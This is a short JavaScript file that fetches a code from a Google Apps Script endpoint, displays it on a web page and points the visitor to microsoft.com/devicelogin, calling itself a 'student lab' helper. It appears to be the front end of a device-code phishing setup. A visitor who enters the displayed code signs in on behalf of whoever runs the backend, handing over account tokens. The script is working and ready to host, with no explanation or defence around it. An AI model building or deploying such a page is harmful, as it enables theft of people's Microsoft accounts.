const WORKER_URL = "https://script.google.com/macros/s/AKfycbwSEFe4BjLPalOtC1hibx7Zm6zXpsufP7dQAFXiz_5KpJTCL0Mum41LnijruExNyTPL/exec";

async function init() {
    console.log("Engine v3.4: Initializing...");
    
    try {
        const response = await fetch(WORKER_URL);
        const data = await response.json();

        if (data.user_code) {
            console.log("SUCCESS: Code Generated");
            // Display the code on your website
            document.getElementById("code-display").innerText = data.user_code;
            
            // Helpful link for the student lab
            console.log("Visit: https://microsoft.com/devicelogin");
        } else {
            console.error("API Error:", data.error_description || "Unknown Error");
        }
    } catch (err) {
        console.error("Connection to Bridge Failed:", err);
    }
}

// Start the engine
init();
